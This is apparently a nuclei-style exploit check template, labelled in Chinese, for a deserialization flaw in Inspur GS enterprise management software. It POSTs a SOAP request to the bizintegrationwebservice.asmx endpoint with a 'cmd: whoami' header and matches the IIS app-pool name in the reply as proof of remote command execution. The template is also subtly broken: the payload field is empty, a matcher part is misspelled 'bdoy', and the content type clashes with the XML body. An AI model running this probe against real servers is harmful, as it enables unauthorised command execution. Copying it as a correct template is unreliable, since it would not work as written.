script_name: 浪潮GS企业管理软件GetChildFormAndEntityList反序列化漏洞
content:
id: 浪潮GS企业管理软件GetChildFormAndEntityList反序列化漏洞

info:
  name: 浪潮GS企业管理软件GetChildFormAndEntityList反序列化漏洞
  author: WanAn
  severity: high
  description: 浪潮GS企业管理软件GetChildFormAndEntityList反序列化漏洞

requests:
  - method: POST
    path:
      - "{{BaseURL}}/cwbase/gsp/webservice/bizintegrationwebservice/bizintegrationwebservice.asmx"

    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Content-Type: application/json;charset=utf-8
      Accept-Encoding: gzip
      Connection: close
      cmd: whoami
    
    body: |
       <?xml version="1.0" encoding="utf-8"?>
       <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
         <GetChildFormAndEntityList xmlns="http://tempuri.org/">
          <baseFormID>string</baseFormID>
          <baseEntityID>string</baseEntityID>
      
       
          <strFormAssignment></strFormAssignment>
            <isBase>0</isBase>
           </GetChildFormAndEntityList>
          </soap:Body>
         </soap:Envelope>:
    
    matchers-condition: and
    matchers:
      - type: status
        part: header
        status:
          - 200
      - type: word
        part: bdoy
        words:
          - 'iis apppool\cwbase'
help: 浪潮GS企业管理软件GetChildFormAndEntityList反序列化漏洞
